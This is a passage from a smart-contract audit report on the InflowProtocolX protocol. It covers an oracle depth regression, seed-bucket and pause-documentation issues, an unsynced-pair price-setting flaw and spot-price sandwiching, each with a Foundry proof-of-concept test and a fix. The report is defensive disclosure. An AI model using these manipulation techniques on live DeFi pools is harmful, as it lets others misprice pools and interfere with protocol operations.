    function _swap(IPair pair, address tokenIn, uint256 amountIn) internal {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        bool zeroForOne = tokenIn == pair.token0();
        (uint256 rIn, uint256 rOut) = zeroForOne ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 out = (amountIn * 9971 * rOut) / (rIn * 10_000 + amountIn * 9971);

        Token(tokenIn).mint(address(pair), amountIn);
        pair.swap(zeroForOne ? 0 : out, zeroForOne ? out : 0, trader, "");
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}
```

`test/audit/issues/FeeIncomeMeasured.fork.t.sol`: LP income on real V1 and V2 pairs

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IFactoryM {
    function createPair(address a, address b) external returns (address);
    function feeTo() external view returns (address);
}

interface IPairM {
    function mint(address to, address senderOrigin) external returns (uint256);
    function burn(address to, address senderOrigin) external returns (uint256, uint256);
    function swap(uint256 out0, uint256 out1, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract TokenM {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// MEASURES, on the real PulseX V1 and V2 pair contracts (pinned fork), what a liquidity provider that owns a
/// share s of a pool gets from the swap fees, as a fraction of the swap volume. Tokens are 1:1 so values are in
/// token units. The result (bps of volume) is then scaled by the measured daily volume of each sim scenario.
///
///   PULSECHAIN_RPC_URL=https://rpc.pulsechain.com forge test --skip ExpansionFlows \
///     --match-path test/audit/issues/FeeIncomeMeasured.fork.t.sol -vv
contract FeeIncomeMeasured is Test {
    address constant V1_FACTORY = 0x1715a3E4A142d8b698131108995174F37aEBA10D; // InflowAddresses.PULSEX_FACTORY
    address constant V2_FACTORY = 0x29eA7545DEf87022BAdc76323F373EA1e707C523;
    uint256 constant FORK_BLOCK = 28_091_000;

    uint256 constant DEPTH = 1_000_000_000e18; // per side, whole pool
    uint256 constant TRADE = 5_000_000e18;
    uint256 constant TRADES = 400; // volume = 2e9 token units = 2x the depth, alternating directions

    address protocol = makeAddr("protocolLp");
    address other = makeAddr("otherLp");
    address trader = makeAddr("trader");

    function setUp() public {
        vm.createSelectFork(vm.envString("PULSECHAIN_RPC_URL"), FORK_BLOCK);
    }

    function test_measuredFeeIncome() public {
        console2.log("fork block", FORK_BLOCK);
        console2.log("volume per run (token units, 1e18)", (TRADE * TRADES) / 1e18);
        uint256[2] memory shares = [uint256(10_000), 5_000];
        for (uint256 i; i < 2; i++) {
            (uint256 g1, uint256 vol) = _run(V1_FACTORY, shares[i]);
            (uint256 g2,) = _run(V2_FACTORY, shares[i]);
            console2.log("protocol share of the pool (bps)", shares[i]);
            console2.log("  V1: protocol fee income (token units, 1e18)", g1 / 1e18);
            console2.log("  V2: protocol fee income (token units, 1e18)", g2 / 1e18);
            console2.log("  V1 income as bps of swap volume x100", (g1 * 1_000_000) / vol);
            console2.log("  V2 income as bps of swap volume x100", (g2 * 1_000_000) / vol);
            console2.log("  V2 minus V1 as bps of swap volume x100", ((g2 - g1) * 1_000_000) / vol);
            assertEq(g1, 0, "V1: the LP kept part of the fee growth");
            assertGt(g2, 0, "V2: the LP kept none of the fee growth");
        }
    }

    /// Returns the protocol LP's value gain (both sides, token units) and the swap volume.
    function _run(address factory, uint256 shareBps) internal returns (uint256 gain, uint256 volume) {
        TokenM a = new TokenM();
        TokenM b = new TokenM();
        address pair = IFactoryM(factory).createPair(address(a), address(b));
        require(IFactoryM(factory).feeTo() != address(0), "protocol fee is off");

        uint256 protocolDep = (DEPTH * shareBps) / 10_000;
        uint256 otherDep = DEPTH - protocolDep;
        // The first liquidity provider mints against an empty pool, the second against the live pool.
        a.mint(pair, protocolDep);
        b.mint(pair, protocolDep);
        uint256 lpTokens = IPairM(pair).mint(protocol, protocol);
        if (otherDep > 0) {
            a.mint(pair, otherDep);
            b.mint(pair, otherDep);
            IPairM(pair).mint(other, other);
        }

        for (uint256 i; i < TRADES; i++) {
            _swap(IPairM(pair), i % 2 == 0 ? a : b, TRADE);
        }
        volume = TRADE * TRADES;

        vm.prank(protocol);
        IPairM(pair).transfer(pair, lpTokens);
        (uint256 o0, uint256 o1) = IPairM(pair).burn(protocol, protocol);
        uint256 value = 2 * _sqrt(o0 * o1); // price-neutral value of the LP's payout (as in the first PoC)
        gain = value > 2 * protocolDep ? value - 2 * protocolDep : 0;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _swap(IPairM pair, TokenM tokenIn, uint256 amountIn) internal {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        bool zeroForOne = address(tokenIn) == pair.token0();
        (uint256 rIn, uint256 rOut) = zeroForOne ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 out = (amountIn * 9971 * rOut) / (rIn * 10_000 + amountIn * 9971);
        tokenIn.mint(address(pair), amountIn);
        pair.swap(zeroForOne ? 0 : out, zeroForOne ? out : 0, trader, "");
    }
}
```

## Recommendation

If V1 stays, say in the README and the brief that protocol-owned liquidity earns no swap fees there, correct the "PulseX V2" wording and the `polUsd()` comment, and extend `test_32_polUsd_risesOnLpFeeAccrual()` through the next liquidity add on a pair that has the V1 fee mint, where the gain disappears.

One option to stop B reading high is to value the position net of the pending `feeTo` mint, by adding to `totalSupply` the LP the next mint will create. I have not tested it.

If the fee income is wanted, the IPX pairs have to be on V2. The anchor stays on V1, so that means a second router and factory for the IPX pairs.

## Team Response

Fixed.

# [L-10] A Temporary Drop in Observed Route Liquidity Can Delay Rail Progression and Restrict Swaps

## Severity

Low Risk

## Description

The fix that introduced window-based liquidity checks for rail valuation and swap sizing also introduced this regression. The fix was intended to prevent liquidity available only at execution from qualifying an otherwise shallow route. The oracle now records the product of a pool’s reserves at the start and end of each observation window. It uses the lower of those two values to estimate the pool’s depth.

Each observation serves as both the end of one window and the start of the next. If liquidity is temporarily low at that boundary, the oracle can report reduced depth for two consecutive completed windows. The pool can return to its original reserves and price immediately after the observation, while the protocol continues to apply the lower depth to rail valuation and swap sizing.

## Location of Affected Code

`TWAPOracle.update()` records the boundary observation in both windows. `windowDepth()` uses the stored minimum to calculate the reserve available on the requested side of the pool.

File: [src/TWAPOracle.sol#L454-L456](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/src/TWAPOracle.sol#L454-L456)

```solidity
uint224 kNow = _liquidity(pair);
d.kMin = d.kStart < kNow ? d.kStart : kNow;
d.kStart = kNow;
```

File: [src/TWAPOracle.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/src/TWAPOracle.sol)

- `update()` (L393-L410)
- `_pin()` (L441-L460)
- `windowDepth()` (L732-L746)

- **Rail valuation.** The vault caps the quantity of rail tokens it values at one tenth of the deepest approved route’s reported rail-side reserve. The expansion module checks the resulting protocol-owned liquidity (POL) value before opening the next rail.
- **Swap sizing.** The expansion module limits each swap hop using the lower of the live input reserve and the depth reported for the completed window. The lower historical reading can therefore continue to restrict a swap after the pool has recovered.

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/src/VaultController.sol)

- `_railToUsd()` (L1616-L1634)
- `_routeDepth()` (L1638-L1641)

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/src/ExpansionModule.sol)

- `checkExpansion()` (L420-L476): rail opening condition (L438-L441)
- `_twapHopOut()` (L1360-L1411): window-depth hop cap (L1378-L1397)

## Impact

A rail’s reported POL can fall below the $25,000 threshold even though the protocol still holds the same LP position. This delays the next rail and can delay later stages that depend on it. A seed or contribution can also be deferred if its swap exceeds the reduced limit and no alternative route qualifies.

Low severity reflects the conditions required and the consequences observed. Sustaining a delay requires control of a substantial share of the relevant pool’s liquidity and repeated influence over the boundary observations. A sufficiently deep alternative approved route can preserve progression. The demonstrated effect is a delay with no direct loss of funds.

## Proof of Concept

The reported rail regression found that measured POL remained below the $25,000 opening threshold after the approved route pool recovered its original depth and through the next normal observation. This establishes the reported effect on the progression check. The effect on swaps follows from the separate hop-size check.

Two repository tests independently verify the underlying oracle behavior. In the steady-pool control, reported depth matches the reserves. In the recovery test, the pool grows to eleven times its original depth. The first reading still reports the original USDC depth. After a full window at the higher liquidity, the oracle reports eleven times the original depth on both sides. [Test source](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/test/unit/TWAPOracleWindowDepth.t.sol#L105-L116)

Run from protocol commit `3582bf7927e3a46e097f00711df97cd114cb422a` using the default Foundry profile.

```sh
forge test --match-path test/unit/TWAPOracleWindowDepth.t.sol --match-test 'test_(steadyPool_depthIsItsReserves|depthHeldAcrossAWholeWindow_counts)' -vv
```

Verified output with solc 0.8.20:

```text
[PASS] test_depthHeldAcrossAWholeWindow_counts()
[PASS] test_steadyPool_depthIsItsReserves()
2 passed, 0 failed, 0 skipped
```

## Recommendation

Retain the conservative depth bound for swap execution. For rail progression, use observations across the window so that a sustained loss of route liquidity reduces the valuation while a brief change at a single boundary has limited influence.

Add regression tests for a brief boundary change, sustained shallow liquidity, and recovery through a second approved route. Verify both the reported POL and the resulting progression decision. Separately verify that liquidity added only at execution cannot raise the permitted swap size.

## Team Response

Fixed.

# [I-01] The Protected Rail Seed Keeps Filling While the Next Rail Cannot Open, and the Owner Cannot Pause or Release It

## Severity

Informational Risk

## Description

The vault reserves a protected bucket of stable for the next two rail seeds and excludes it from all other spending. Conversion routes part of every round into the bucket until it reaches its target of about $10,000. The bucket only shrinks when a rail is seeded or when the target drops, and the target only drops when a rail opens.

Pre-funding the seeds is deliberate. The `seedTarget()` NatSpec (`ExpansionModule.sol` L437-L438) says the target moves only when a rail opens, and the team's `ProtectedSeed.t.sol` (L206-L225) asserts that the full target stays protected while expansion is disabled. The target, however, never asks whether the next rail can actually open. It stays at its full value when the owner disables expansion, when the rail's route pools are too shallow, or when the reserve wallet cannot cover the rail's IPX leg.

The owner has no function to pause the accrual or release the bucket. A migration releases it only when the successor uses a different stable or the stable transfer fails (`VaultController.sol` L934-L943), so a migration to a vault with the same stable carries it over unchanged.

The reservation is tied to the next rail in the queue, with no owner control over it while that rail cannot open.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `seedTarget()` (L439-L446) and its NatSpec (L433-L438)
- `setExpansionEnabled()` (L293-L297)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `creditProtectedSeed()` (L774-L781)
- `getStableSurplus()` (L716-L720)
- `_releaseProtectedSeedAbove()` (L998-L1003)
- protected seed handoff on migration (L934-L943)

File: [src/ConversionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol)

- `_seedSizing()` (L427-L440)

File: [src/InflowConstants.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/InflowConstants.sol)

- `STAGE0_SEED_ALLOC_BPS` (L294)

## Impact

While the next rail cannot open, conversion keeps diverting stable into the bucket until about $10,000 sits idle instead of going into base liquidity, and the owner cannot stop it. No funds are lost: re-enabling expansion, or fixing whatever blocks the rail, lets the seed be spent.

## Proof of Concept

The route pools are seeded, so PRVX opens as soon as expansion is enabled (the control). With expansion disabled and the bucket emptied, ordinary conversion rounds refill it while the target stays unchanged.

Add the test below as `test/audit/issues/I-03.t.sol` and run:

```bash
forge test --match-path test/audit/issues/I-03.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {console2} from "forge-std/console2.sol";

contract Issue_I03 is InflowFixture {
    function setUp() public override {
        super.setUp();
        vm.startPrank(owner);
        conversion.setTWAPOracle(address(twapOracle));
        vault.setTWAPOracle(address(twapOracle));
        arb.setTWAPOracle(address(twapOracle));
        vm.stopPrank();
        _seedExpansionPools();
    }

    function test_seedBucketKeepsFillingWhileExpansionIsDisabled() public {
        uint256 snap = vm.snapshotState();
        assertEq(_checkExpansionAsVault(), InflowConstants.railSeedUsd(0), "control: PRVX seed not spent");
        assertTrue(expansion.prvxActive(), "control: PRVX did not open");
        vm.revertToState(snap);

        vm.prank(owner);
        expansion.setExpansionEnabled(false);
        _drainSeedBucket();
        uint256 target = expansion.seedTarget();

        for (uint256 i; i < 12; i++) {
            _pinWindows();
            _sellIpxForWpls(alice, 1_000e18);
        }

        console2.log("seedTarget (usdc6)     :", expansion.seedTarget());
        console2.log("protected seed (usdc6) :", vault.protectedSeedStable());
        assertFalse(expansion.prvxActive(), "PRVX opened");
        assertEq(expansion.seedTarget(), target, "target changed");
        assertGt(vault.protectedSeedStable(), 0, "conversion did not refill the bucket");
    }

    function _pinWindows() internal {
        vm.warp(block.timestamp + twapOracle.windowSeconds() + 1);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        twapOracle.update(wplsUsdcPair);
    }
}
```

## Recommendation

Document that the bucket keeps filling while the next rail cannot open, or add an explicit owner flag that pauses seed accrual. Simpler fixes fall short: a manual release is refilled by the next round, a zero target while expansion is disabled dumps the whole bucket into LP on any brief toggle, and a target based on live route depth can be flipped by moving a route pool.

## Team Response

Fixed.

# [I-02] A Zero Sell Tax Is Documented as a Pause, but the Keeper's `poke()` Still Runs the Cycle

## Severity

Informational Risk

## Description

The code and README present a zero sell tax as the switch that pauses the protocol:

- `IPXToken.setTaxes()` NatSpec: "A zero sell tax stops the protocol cycle entirely: the cycle is triggered only by sells that credit tax to the vault, and nothing else can trigger it."
- `IPXToken._update()`: requiring a real sell tax "makes a zero sell tax stop the cycle on every path."
- README: "Sell tax 0 pauses the cycle: only taxed sells trigger it, so no conversion, deployment or expansion runs until a non-zero sell tax is restored".

The token's own trigger does stop: `_update()` calls the cycle only when `sellTax > 0`. But the cycle has a second entry point. `VaultController.poke()` lets the keeper or the owner run the same `_runCycle()`, and it checks only the caller and `tradingOpen`. Nothing on this path reads the sell tax. The launch playbook tells operators to have the keeper call `poke()` every few minutes, so while the sell tax is zero, the keeper keeps converting vault IPX, deploying and locking liquidity and seeding rails after every 30-minute cooldown. `setKeeper()`'s own NatSpec says "the keeper moves no funds the cycle would not move on the next taxed sell", but with a zero sell tax there is no next taxed sell. No team test runs `poke()` with a zero sell tax.

`poke()` is restricted to the keeper and the owner and runs the normal guarded cycle, so no untrusted party can use this path. The problem is the documentation: an operator who follows it to pause the protocol is never told that the keeper keeps running.

The documented pause covers only the token's sell trigger, and `poke()` enters `_runCycle()` without checking the sell tax.

## Location of Affected Code

File: [src/IPXToken.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol)

- `setTaxes()` NatSpec (L288-L294)
- `_update()` comment (L428-L429)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `setKeeper()` NatSpec (L286-L290)
- `poke()` (L403-L407)
- `_runCycle()` (L409-L626)

File: [README.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/README.md)

- `IPXToken.setTaxes()` owner-surface entry (L329)

## Impact

An operator who sets the sell tax to zero to pause the protocol, for example during an incident, still has the keeper running the full cycle after every cooldown. To actually pause it, the operator also needs `setKeeper(address(0))`, which the documentation does not mention.

## Proof of Concept

Add the test below as `test/audit/issues/I-02.t.sol` and run:

```bash
forge test --match-path test/audit/issues/I-02.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";

contract Issue_I02 is InflowFixture {
    address internal keeper = makeAddr("keeper");

    function test_zeroSellTaxDoesNotPauseKeeperCycle() public {
        vm.startPrank(owner);
        vault.setTWAPOracle(address(twapOracle));
        conversion.setTWAPOracle(address(twapOracle));
        deployer.setTWAPOracle(address(twapOracle));
        arb.setTWAPOracle(address(twapOracle));
        vault.setKeeper(keeper);
        vm.stopPrank();
        vm.warp(block.timestamp + twapOracle.windowSeconds() + 1);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        twapOracle.update(wplsUsdcPair);
        vm.warp(block.timestamp + 70 minutes);
        uint256 vaultIpx0 = ipx.balanceOf(address(vault));

        vm.prank(owner);
        ipx.setTaxes(50, 0);

        vm.prank(keeper);
        vault.poke();

        assertLt(ipx.balanceOf(address(vault)), vaultIpx0, "no vault IPX converted at zero sell tax");
        assertEq(vault.lastExecutionTime(), block.timestamp, "cycle did not run at zero sell tax");
    }
}
```

## Recommendation

Correct the `setTaxes()` NatSpec, the `_update()` comment, the `setKeeper()` NatSpec and the README to say that a zero sell tax stops only the sell trigger, and list `setKeeper(address(0))` as part of the pause. Alternatively, return early from `poke()` (or at the top of `_runCycle()`) when the token's sell tax is zero, so both entry points honour the same pause.

## Team Response

Fixed.

# [I-03] An IPX/Rail Pair That Was Created but Never Synced Bypasses the Dust Checks, so the First Rail Seed Opens at a Price Set by Whoever Sent Tokens to the Pair

## Severity

Informational Risk

## Description

A first rail seed must open the IPX/rail pool at the TWAP-based price, because anyone can create the pair and send tokens to it beforehand. The module accepts a pair that already holds tokens only if each balance is at most 1% of the planned seed.

Whether the pair already holds tokens, however, is decided from its reserves, not its balances. A pair that received tokens without a `sync()` call has zero reserves and arbitrary balances, so it is treated as empty: neither the 1% check nor the 5% band for existing pairs runs. When the protocol then adds its seed, the pair's first mint counts the pre-sent tokens as part of the deposit, and the pool opens at a ratio the sender chose. Since anyone can skim unsynced tokens, the sender does this in the same transaction that triggers the seed.

The pair state is classified from reserves instead of balances.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `_try()` (L639-L826)
- `_planSeed()` (L887-L965)
- `_addRailLiquidity()` (L831-L876)
- `_dustWithinBound()` (L996-L1008)

## Impact

A third party can choose the price at which a new rail pool opens by sending tokens to the pair without syncing it before the first seed. The protocol loses no value, since the sent tokens become part of its liquidity, but the rail opens mispriced. Until arbitrage corrects the price, the protocol's next contributions to that rail are refused, and the pool's TWAP records the wrong price, which feeds into this rail's liquidity value and the gate for the next rail.

## Proof of Concept

Add the test below as `test/audit/issues/I-01.t.sol` and run:

```bash
forge test --match-path test/audit/issues/I-01.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {MockUniswapV2Pair} from "../../mocks/MockUniswapV2Pair.sol";
import {console2} from "forge-std/console2.sol";

contract Issue_I01 is InflowFixture {
    function test_unsyncedDonationSetsOpeningPrice() public {
        _seedExpansionPools();

        // Donor: create the pair and send 10M IPX, no sync (reserves stay 0/0).
        address pair = factory.createPair(address(ipx), address(prvx));
        deal(address(ipx), pair, 10_000_000e18);
        (uint112 r0, uint112 r1,) = MockUniswapV2Pair(pair).getReserves();
        assertEq(uint256(r0) + uint256(r1), 0, "reserves not empty");

        // Protocol seeds the rail: full seed spent, PRVX active.
        uint256 spent = _checkExpansionAsVault();
        assertEq(spent, InflowConstants.railSeedUsd(0), "seed not spent in full");
        assertTrue(expansion.prvxActive(), "PRVX not activated");

        // Opening price vs the TWAP-chain fair price (IPX per 1,000 PRVX).
        (r0, r1,) = MockUniswapV2Pair(pair).getReserves();
        (uint256 ipxRes, uint256 prvxRes) =
            MockUniswapV2Pair(pair).token0() == address(ipx) ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 spotIpx = (1_000e18 * ipxRes) / prvxRes;
        uint256 fairIpx = _twapUsdToIpx(_twapRailToUsd(address(prvx), 1_000e18));
        console2.log("spot IPX per 1000 PRVX:", spotIpx);
        console2.log("fair IPX per 1000 PRVX:", fairIpx);

        // Impact: the pool opened more than 10% off fair, past both the 1% dust
        // bound and the 5% band applied to every other seed and contribution.
        assertGt(spotIpx, (fairIpx * 110) / 100, "pool opened near the fair price");
    }
}
```

## Recommendation

Call `sync()` on an existing pair with no supply before classifying it, or classify it from balances instead of reserves.

## Team Response

Fixed.

# [I-04] WPLS Is Valued at the Live Anchor Spot (Inside the 20% Guard) for D, Fundable USD and the LiquidityDeployer Treasury Cap

## Severity

Informational Risk

## Description

The protocol values its WPLS at the live WPLS/stable spot price, which one transaction can move by up to the 20% manipulation guard. A third party can therefore decide when a round runs or deploys while the convert gate or the deploy gate sits close to its threshold, and, once the treasury is active, can slightly overstate the WPLS leg that the treasury's share is computed on.

`VaultController._calculateD()` reads the anchor spot with `_wplsStablePriceQ()`. It uses the TWAP only for the 20% guard in `_twapManipulationCheck()`, which measures deviation against `min(spot, twap)`. Spot can therefore sit anywhere in [TWAP / 1.2, 1.2 · TWAP], that is, from about -16.7% to +20% around the TWAP. `_D()` applies it both to the WPLS surplus and to the second hop of the IPX leg. The same spot feeds D at STEP 3, the post-expansion recompute (`VaultController.sol:491`), the post-conversion re-check (`VaultController.sol:553`), the convert gate (`VaultController.sol:516-517`) and the rate tier (`VaultController.sol:540`). It also feeds `getFundableUsd()`, which gates deployment (`VaultController.sol:574`). The push scales only the WPLS-priced parts of these figures; the stable surplus is unaffected, so whenever the vault holds stable surplus the swing in D or fundable USD is smaller than the spot band, and "near" a threshold means within that reduced swing.

D itself is ignored downstream: `ExpansionModule.checkExpansion()` leaves the parameter unnamed and `LiquidityDeployer.deploy()` discards it (`D;`). The deploy is sized in token units, half of each surplus, so apart from the treasury slice below, the bias never changes how much capital moves. It moves only the convert gate, the rate tier and, through fundable USD, the deploy gate: when a round runs, how large one capped round is, and whether it deploys.

`LiquidityDeployer._planDeploy()` prices the WPLS leg with the spot `_wplsToUsdc()`. It caps the treasury slice at the smaller of two terms: the slice's share of the stable budget, and `(wplsUsd + stableBudget) * 400 / 10_000`, the treasury's 4% table share of the whole deploy. In row 5 of the allocation table, the second term binds whenever `wplsUsd < (16/9) * stableBudget`, that is, whenever the vault holds more stable than the 64/36 refill ratio. In that stable-heavy case, an upward anchor push inflates `wplsUsd` while the WPLS actually deployed stays the same, so the treasury is paid 4% of an overstated deploy.

The deploy NatSpec (`LiquidityDeployer.sol:194-202`) describes this cap correctly. When the vault is heavy in WPLS, the first term binds and the payout does not depend on WPLS at all. When it is heavy in stable, WPLS sent to the vault raises the payout only because the deploy itself grows: the treasury still receives exactly its documented 4% of the deploy, the donated WPLS is locked as IPX/WPLS POL over the following rounds, and the donor gives up 25 to 50 times what the treasury gains. That path is intended behaviour. The defect is the spot price, which raises the payout without growing the deploy.

The VaultController NatSpec (`VaultController.sol:66-69`) says "a caller cannot set the rate the vault's inventory is valued at with one swap". Its own preceding clause scopes this to the IPX/WPLS rate, which is a TWAP, so the sentence is not false, but it reads as covering the inventory's valuation as a whole: through the WPLS/stable hop, one anchor swap still moves the inventory's USD value by up to the guard.

The manipulation is a plain sandwich around a trigger. It matters when D is near a convert threshold or rate tier, when fundable USD is near the deploy threshold, or when the vault is stable-heavy in row 5 with the treasury active:

1. Swap on the WPLS/stable pair to just inside the guard. The round trip costs about 0.58% of the amount swapped (two 0.29% swap fees), so the cost grows with the anchor pool's depth.
2. Dust-sell IPX. D crosses (or falls under) `activeConvertThreshold()`, fundable USD crosses `activeDeployThreshold()`, or the treasury slice rises toward its stable-budget share.
3. Unwind.

## Location of Affected Code

D is priced at the anchor spot; the TWAP is used only for the 20% guard:

File: [src/VaultController.sol#L1048-L1073](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1048-L1073)

```solidity
wplsStableQ = _wplsStablePriceQ();
// code
if (twapOracle != address(0)) {
    if (!_twapTracksAnchor()) {
        emit TwapAnchorUnavailable(wplsStablePair);
        return (0, true, wplsStableQ);
    }
    manipulated = _twapManipulationCheck(wplsStableQ);
    if (manipulated) return (0, true, wplsStableQ);
} else if (_spotGuardTripped(wplsStableQ, anchorReference)) {
// code
}

bool ipxPriced;
(D, ipxPriced) = _D(wplsStableQ);
```

The guard only bounds spot to within 20% of the TWAP:

File: [src/VaultController.sol#L1129-L1132](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1129-L1132)

```solidity
uint256 lo = wplsStableQ < twapPriceQ_ ? wplsStableQ : twapPriceQ_;
if (lo == 0) return false;
uint256 deviation = _absDiff(wplsStableQ, twapPriceQ_) * 10_000 / lo;
if (deviation > InflowConstants.MANIP_GUARD_BPS) {
```

Fundable USD, which gates deployment, uses the same spot:

File: [src/VaultController.sol#L746-L752](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L746-L752)

```solidity
function getFundableUsd() public view returns (uint256) {
    if (wplsStablePair == address(0)) return 0;
    uint256 wplsStableQ = _wplsStablePriceQ();
    // wplsStableQ is 1e30-scaled.
    uint256 wplsSurplusUsd = (getWplsSurplus() * wplsStableQ) / WPLS_STABLE_Q_SCALE;
    return wplsSurplusUsd + getStableSurplus();
}
```

The treasury cap's second term is priced at the anchor spot:

File: [src/LiquidityDeployer.sol#L333-L355](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L333-L355)

```solidity
    // Same anchor-pair spot price getFundableUsd() values WPLS at.
    if (plan.wplsAmount > 0) plan.wplsUsd = _wplsToUsdc(plan.wplsAmount);
// code
plan.treasuryUsd = Math.min(
    (stableBudget * treasuryBps) / stableWeightBps,
    ((plan.wplsUsd + stableBudget) * treasuryBps) / InflowConstants.BPS_DENOMINATOR
);
```

## Impact

A third party can choose when one capped round runs, occasionally which rate tier it runs at, or skip one round. A skipped round exits early (`VaultController.sol:517-525`) and consumes no cooldown, so suppression lasts only as long as the attacker pays for an anchor round trip on every trigger.

When fundable USD sits near the deploy threshold, the same push decides whether a converting round also deploys. A round that converts without deploying still starts the cooldown (`VaultController.sol:574`, `591`), so that deployment waits one 30-minute window for every round trip the attacker pays.

Each round remains capped by the per-pool `capBps` (`ConversionModule._legCaps()`), and each leg is still banded against its own pool's TWAP.

An anchor push raises the treasury slice by up to about 0.8% of the WPLS leg per cycle, but the full figure needs rails that fill through direct stable pools. A push beyond 5% makes rail buys routed through WPLS decline (`ExpansionModule.sol:1233`), and the payout shrinks with the share of planned liquidity left unplaced (`LiquidityDeployer.sol:280-284`). A push kept inside 5% gives about 0.2%. The excess is stable that would otherwise have stayed in the vault, and it goes to the protocol's own treasury, not to the attacker.

This is Informational: no funds are lost and no party profits. Every effect is either a timing effect, deciding which window a capped round or a deploy lands in, or a fraction of a percent of one WPLS leg moved from the vault to the protocol's own treasury. The path is permissionless and atomic, but it needs D or fundable USD within the reduced swing of a threshold (or stage 5 with a stable-heavy vault for the treasury path), the attacker gains nothing, and it pays an anchor round trip on every trigger it influences. For the treasury path, that round trip costs more than the payout rises unless the WPLS leg exceeds about 7% of the anchor pool's stable reserve.

## Recommendation

Value WPLS at the anchor TWAP for D, `getFundableUsd()` and the treasury cap, and keep the spot price only for the deviation check. `_twapWplsStableQ()` already returns the anchor TWAP at the 1e30 scale `_D()` takes. The change has to reach every caller: `_calculateD()`, the two re-reads that pass the live anchor (`VaultController.sol:491` and `622`) and `getFundableUsd()`, each under the same TWAP-or-nothing rule `_calculateD()` applies, with spot kept only on the unwired bootstrap path. In the deployer, `_wplsToUsdc()` reads both sizes `plan.wplsUsd` and reports the WPLS the pair took, which scales the treasury cut (`LiquidityDeployer.sol:280-284` and `517`). Price both at the same TWAP: valuing the plan at the TWAP and the placed leg at spot would let a downward anchor push trim the treasury payout. The deployer should also read that price from the VaultController rather than through its own `twapOracle`, which can be unset or point at a different oracle (see I-14 and I-15); with no usable price, the existing `plan.wplsUsd == 0` branch places no WPLS leg. Using `min(spot, twap)` instead would stop only the upward push: no forced round and no treasury bump, but a downward push could still skip a round. The trade-off is that a TWAP valuation lags a genuine PLS move by about a window, because the pinned average describes the last completed window.

The cap itself needs no change: with the price fixed, WPLS sent to the vault raises the payout only as the documented 4% share of a larger deploy.

Clarify `VaultController.sol:66-69` so that it does not read as covering the WPLS/stable hop.

## Team Response

Fixed.

# [I-05] ArbitrageMonitor's Live-TWAP Confirmation Needs Only a Few Percent of the Span Held, Not the Half-Window Its NatSpec Claims

## Severity

Informational Risk

